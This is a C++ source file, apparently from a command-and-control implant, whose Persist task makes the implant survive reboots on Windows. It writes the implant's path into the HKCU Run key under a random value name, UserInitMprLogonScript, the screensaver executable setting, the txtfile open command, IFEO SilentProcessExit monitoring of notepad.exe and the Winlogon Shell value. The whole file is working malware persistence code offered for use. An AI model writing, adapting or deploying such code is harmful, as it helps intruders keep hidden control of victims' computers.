#include "core/task.hpp"

namespace Task
{
    std::wstring Persist(State::PSTATE pState, const std::wstring& wTechnique)
    {
        // Get current program (implant) path.
        WCHAR wSelfPath[MAX_PATH];
        DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
        if (dwResult == 0)
        {
            return L"Error: Failed to get the program path.";
        }

        LPCWSTR lpSelfPath = wSelfPath;

        // Persistence process
        if (wcscmp(wTechnique.c_str(), L"runkey") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            std::wstring wValue = Utils::Random::RandomString(8);
        
            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                wValue.c_str(),
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"user-init-mpr-logon-script") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Environment";
        
            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"UserInitMprLogonScript",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"screensaver") == 0)
        {
            // Reference: https://cocomelonc.github.io/tutorial/2022/04/26/malware-pers-2.html
            HKEY hKey;
            std::wstring wSubKey = L"Control Panel\\Desktop";
            const WCHAR* wActivate = L"1"; // 1 => Activate
            const WCHAR* wTimeOut = L"10";

            if (pState->pProcs->lpRegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_WRITE,
                &hKey
            ) != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }
        
            // Create new registry keys.
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"ScreenSaveActive",
                0,
                REG_SZ,
                (BYTE*)wActivate,
                (wcslen(wActivate) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set value to registry.";
            }

            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"ScreenSaveTimeOut",
                0,
                REG_SZ,
                (BYTE*)wTimeOut,
                (wcslen(wTimeOut) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set value to registry.";
            }

            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"SCRNSAVE.EXE",
                0,
                REG_SZ,
                (BYTE*)wSelfPath,
                (wcslen(wSelfPath) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set value to registry.";
            }

            pState->pProcs->lpRegCloseKey(hKey);
            return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
        }
        else if (wcscmp(wTechnique.c_str(), L"default-file-extension-hijacking") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"txtfile\\shell\\open\\command";

            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CLASSES_ROOT,
                wSubKey.c_str(),
                0,
                KEY_WRITE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }

            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCR\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"ifeo") == 0)
        {
            // Reference: https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
            HKEY hKey;
            DWORD dwGF = 512;
            DWORD dwRM = 1;

            const WCHAR* wImg = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
            const WCHAR* wSilent = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";

            // GlobalFlag
            if (pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wImg,
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE | KEY_QUERY_VALUE,
                nullptr,
                &hKey,
                nullptr
            ) != ERROR_SUCCESS)
            {
                return L"Error: Failed to create key: Image File Execution Options\\notepad.exe.";
            }
            
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"GlobalFlag",
                0,
                REG_DWORD,
                (const BYTE*)&dwGF,
                sizeof(dwGF)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set key.";
            }
            pState->pProcs->lpRegCloseKey(hKey);

            if (pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wSilent,
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE | KEY_QUERY_VALUE,
                nullptr,
                &hKey,
                nullptr
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to create key: SilentProcessExit\\notepad.exe.";
            }
            
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"ReportingMode",
                0,
                REG_DWORD,
                (const BYTE*)&dwRM,
                sizeof(dwRM)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set ReportingMode.";
            }
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"MonitorProcess",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set MonitorProcess.";
            }

            pState->pProcs->lpRegCloseKey(hKey);
            return L"Success: The entry has been set to HKLM\\" + std::wstring(wImg) + L" and HKLM\\" + std::wstring(wSilent) + L".";
        }
        else if (wcscmp(wTechnique.c_str(), L"scheduled-task") == 0)
        {
            return L"Error: Not implemented yet.";
        }
        else if (wcscmp(wTechnique.c_str(), L"winlogon") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
            std::wstring wValue = Utils::Random::RandomString(8);

            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                wSubKey.c_str(),
                0,
                KEY_WRITE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }

            std::wstring wExecutables = L"explorer.exe," + std::wstring(wSelfPath);
            LPCWSTR lpExecutables = wExecutables.c_str();
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"Shell",
                0,
                REG_SZ,
                (BYTE*)lpExecutables,
                (wcslen(lpExecutables) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKLM\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else
        {
            return L"Not implemented yet.";
        }
    }
}